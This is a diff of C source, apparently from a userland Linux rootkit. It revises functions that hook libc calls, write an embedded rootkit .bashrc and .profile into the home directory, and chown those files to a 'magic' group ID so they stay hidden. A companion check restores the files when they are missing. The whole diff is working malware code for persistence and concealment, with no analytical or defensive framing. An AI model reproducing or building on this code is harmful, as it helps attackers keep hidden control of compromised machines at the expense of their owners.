@@ -1,15 +1,14 @@
 int writebashrc(void){
     DIR *dp;
 
-    hook(COPENDIR, CFOPEN, CFWRITE);
+    hook(CMKDIR, COPENDIR, CFOPEN, CFWRITE);
     
-    dp = call(COPENDIR, INSTALL_DIR);
-    if(dp == NULL)
-        return -1;
+    dp = call(COPENDIR, HOMEDIR);
+    if(dp == NULL) return -1;
     closedir(dp);
 
     char rcbuf[BASHRC_SIZE], tmp[2], curchar;
-    memset(rcbuf, 0, sizeof(rcbuf));
+    memset(rcbuf, 0, BASHRC_SIZE);
     for(int i = 0; i < BASHRC_SIZE; i++){
         curchar = rkbashrc[i];
         snprintf(tmp, 2, "%c", curchar);
@@ -19,7 +18,7 @@ int writebashrc(void){
 
     FILE *fp;
 
-    fp = call(CFOPEN, INSTALL_DIR"/.profile", "w");
+    fp = call(CFOPEN, PROFILE_PATH, "w");
     char *profile = ". .bashrc";
     if(fp == NULL)
         return -1;
@@ -32,18 +31,22 @@ int writebashrc(void){
     call(CFWRITE, rcbuf, 1, strlen(rcbuf), fp);
     fclose(fp);
 
+    gid_t magicgid = readgid();
+    chown_path(PROFILE_PATH, magicgid);
+    chown_path(BASHRC_PATH, magicgid);
+
     return 0;
 }
 
 void checkbashrc(void){
-    if(not_user(0))
+    if(not_user(0) || !rkprocup() || rknomore())
         return;
 
     struct stat rcstat;
     memset(&rcstat, 0, sizeof(struct stat));
     hook(C__XSTAT, CACCESS);
 
-    int accstat = (long)call(CACCESS, INSTALL_DIR"/.profile", F_OK);
+    int accstat = (long)call(CACCESS, PROFILE_PATH, F_OK);
     int statstat = (long)call(C__XSTAT, _STAT_VER, BASHRC_PATH, &rcstat);
     if((statstat < 0 && errno == ENOENT) || (accstat != 0 && errno == ENOENT)){
         writebashrc();
